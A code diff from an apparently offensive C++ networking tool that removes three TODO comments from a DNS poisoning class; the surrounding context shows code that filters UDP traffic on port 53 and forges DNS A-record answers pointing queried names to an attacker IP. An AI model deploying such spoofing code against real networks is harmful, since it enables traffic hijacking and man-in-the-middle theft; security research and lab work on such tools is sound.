@@ -14,8 +14,6 @@
 #include <future>
 #include <stdexcept>
 
-// TODO (extract constant)
-
 const int DNS_PORT = 53;
 
 void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
@@ -73,7 +71,6 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
 
     dnsResponse.addQuery(dnsQuery); // Repeat the question
     pcpp::IPv4DnsResourceData attackerIpData(attackerIp_);
-    // TODO (kala and nick) figure out TTL value
     const int ttl = 60;
     dnsResponse.addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_A,
                           pcpp::DNS_CLASS_IN, ttl, &attackerIpData);
@@ -95,8 +92,6 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
 void ATK::DNS::AllOutDnsPoisoningStrategy::execute() {
     std::promise<void> completionPromise;
     std::future completionFuture = completionPromise.get_future();
-
-    // TODO(kala and nick) decide if default port is enough
 
     pcpp::PortFilter dnsPortFilter(DNS_PORT, pcpp::SRC_OR_DST);
     pcpp::ProtoFilter udpFilter(pcpp::UDP);
